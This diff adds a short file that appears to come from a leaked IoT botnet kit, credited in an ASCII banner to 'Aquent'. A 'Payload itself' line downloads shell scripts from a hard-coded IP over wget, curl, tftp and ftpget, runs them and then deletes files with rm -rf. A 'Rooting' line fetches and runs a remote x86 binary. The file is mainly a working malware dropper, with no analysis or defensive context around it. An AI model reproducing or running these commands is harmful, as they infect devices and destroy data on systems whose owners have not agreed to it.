@@ -1,0 +1,15 @@
+Payload itself:
+cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://107.175.59.192/InsaneSec.sh; curl -O http://107.175.59.192/InsaneSec.sh; chmod 777 InsaneSec.sh; sh InsaneSec.sh; tftp 107.175.59.192 -c get InsaneSec.sh; chmod 777 InsaneSec.sh; sh InsaneSec.sh; tftp -r InsaneSec2.sh -g 107.175.59.192; chmod 777 InsaneSec2.sh; sh InsaneSec2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.175.59.192 InsaneSec1.sh InsaneSec1.sh; sh InsaneSec1.sh; rm -rf InsaneSec.sh InsaneSec.sh InsaneSec2.sh InsaneSec1.sh; rm -rf *
+
+
+Rooting: wget 107.175.59.192/bins/vcimanagement.x86; chmod 777 *; ./vcimanagement.x86
+
+/*
+██╗     ███████╗ █████╗ ██╗  ██╗███████╗██████╗     ██████╗ ██╗   ██╗     █████╗  ██████╗ ██╗   ██╗███╗   ██╗███████╗████████╗
+██║     ██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔═══██╗██║   ██║████╗  ██║██╔════╝╚══██╔══╝
+██║     █████╗  ███████║█████╔╝ █████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ███████║██║   ██║██║   ██║██╔██╗ ██║█████╗     ██║   
+██║     ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██╔══██║██║▄▄ ██║██║   ██║██║╚██╗██║██╔══╝     ██║   
+███████╗███████╗██║  ██║██║  ██╗███████╗██████╔╝    ██████╔╝   ██║       ██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║███████╗   ██║   
+╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═╝ ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝  
+                                                                 Discord: aqu#0007                                                                                      
+*/
